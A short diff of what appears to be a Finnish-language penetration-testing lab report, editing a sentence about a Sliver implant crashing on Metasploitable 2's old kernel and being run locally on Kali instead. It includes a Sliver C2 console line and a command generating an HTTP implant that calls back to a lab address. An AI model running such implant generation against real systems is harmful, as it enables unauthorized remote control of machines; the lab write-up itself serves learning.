@@ -88,7 +88,7 @@ sliver > http
 
 
 
-Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännetyt Sliver-implantit vaativat Linux-kernelin version 2.6.32 tai uudemman. Koska Metasploitable 2:n kernel on ikivanha (2.6.24), implantti kaatui kohteessa välittömästi (ChatGPT). Raportointia ja analyysia varten implantti generoitiin ja suoritettiin paikallisesti Kalilla:
+Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännetyt Sliver-implantit vaativat Linux-kernelin version 2.6.32 tai uudemman. Koska Metasploitable 2:n kernel on ikivanha (2.6.24), implantti kaatui kohteessa välittömästi (ChatGPT). Analyysia varten implantti generoitiin ja suoritettiin paikallisesti Kalilla:
 
 ```
 generate --http 192.168.18.129 --os linux --arch amd64 --save ./sliver_http.elf
